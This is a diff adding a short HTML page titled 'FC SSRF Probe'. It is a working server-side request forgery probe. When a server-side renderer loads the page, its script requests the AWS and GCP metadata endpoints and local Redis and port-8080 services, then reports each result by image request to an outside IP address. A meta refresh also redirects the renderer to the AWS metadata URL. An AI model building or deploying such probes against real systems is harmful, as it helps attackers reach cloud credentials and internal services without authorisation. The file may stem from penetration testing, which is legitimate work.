@@ -1,0 +1,25 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>FC SSRF Probe</title>
+<meta http-equiv="refresh" content="1;url=http://169.254.169.254/latest/meta-data/">
+</head>
+<body>
+<h1>fc-ssrf-probe</h1>
+<script>
+fetch('http://169.254.169.254/latest/meta-data/', {mode:'no-cors'})
+  .then(() => { new Image().src = 'https://129.226.203.245/ssrf?r=reached&t=aws'; })
+  .catch(() => { new Image().src = 'https://129.226.203.245/ssrf?r=failed&t=aws'; });
+fetch('http://metadata.google.internal/computeMetadata/v1/', {mode:'no-cors'})
+  .then(() => { new Image().src = 'https://129.226.203.245/ssrf?r=reached&t=gcp'; })
+  .catch(() => { new Image().src = 'https://129.226.203.245/ssrf?r=failed&t=gcp'; });
+fetch('http://127.0.0.1:6379/', {mode:'no-cors'})
+  .then(() => { new Image().src = 'https://129.226.203.245/ssrf?r=reached&t=redis'; })
+  .catch(() => { new Image().src = 'https://129.226.203.245/ssrf?r=failed&t=redis'; });
+fetch('http://127.0.0.1:8080/', {mode:'no-cors'})
+  .then(() => { new Image().src = 'https://129.226.203.245/ssrf?r=reached&t=p8080'; })
+  .catch(() => { new Image().src = 'https://129.226.203.245/ssrf?r=failed&t=p8080'; });
+</script>
+</body>
+</html>
